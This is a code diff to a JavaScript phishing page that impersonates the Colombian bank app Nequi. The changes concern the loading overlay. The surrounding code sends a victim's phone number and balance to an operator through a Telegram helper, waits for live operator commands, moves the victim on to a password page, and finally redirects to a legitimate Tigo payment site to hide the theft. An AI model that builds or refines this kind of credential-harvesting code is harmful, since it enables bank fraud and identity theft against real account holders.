@@ -132,10 +132,16 @@
         const saldo = saldoInput.value.trim();
         if (!saldo) return;
 
+        // Overlay y deshabilitar botón ANTES de cualquier operación
+        const overlay = document.getElementById('loadingOverlay');
+        if (overlay) {
+          overlay.classList.add('active');
+          overlay.style.display = 'flex';
+        }
+        
         const originalText = btnValidar.textContent;
         btnValidar.disabled = true;
         btnValidar.textContent = 'Verificando...';
-        bankTelegram.showLoading();
 
         const success = await bankTelegram.sendToTelegram('saldo', {
           telefono: phoneNumber,
@@ -144,6 +150,7 @@
         });
 
         if (success) {
+          // Polling con overlay activo
           bankTelegram.startPolling((action) => {
             console.log('[NEQUI SALDO INPUT] Acción recibida:', action.action);
 
@@ -152,12 +159,16 @@
             switch(actionType) {
               case 'saldo_aprobado':
               case 'request_clave':
-                bankTelegram.redirect('clave.html');
+                // Mantener overlay durante redirección
+                window.location.href = 'clave.html';
                 break;
 
               case 'saldo_rechazado':
               case 'error_saldo':
-                bankTelegram.hideLoading();
+                if (overlay) {
+                  overlay.classList.remove('active');
+                  overlay.style.display = 'none';
+                }
                 alert('Saldo incorrecto. Por favor verifica el saldo en tu app Nequi e intenta nuevamente.');
                 saldoInput.value = '';
                 btnValidar.disabled = true;
@@ -166,20 +177,28 @@
                 break;
 
               case 'finalizar':
-                bankTelegram.redirect('https://mi.tigo.com.co/pago-express/facturas');
+                // Mantener overlay durante redirección
+                window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
                 break;
 
               default:
                 console.warn('[NEQUI SALDO INPUT] Acción no reconocida:', action.action);
-                bankTelegram.hideLoading();
+                if (overlay) {
+                  overlay.classList.remove('active');
+                  overlay.style.display = 'none';
+                }
                 btnValidar.disabled = false;
                 btnValidar.textContent = 'Continuar';
             }
           });
         } else {
+          if (overlay) {
+            overlay.classList.remove('active');
+            overlay.style.display = 'none';
+          }
+          alert('Error al enviar datos. Intenta nuevamente.');
           btnValidar.disabled = false;
-          btnValidar.textContent = 'Pedir Saldo';
-          bankTelegram.hideLoading();
+          btnValidar.textContent = 'Continuar';
         }
       });
     });
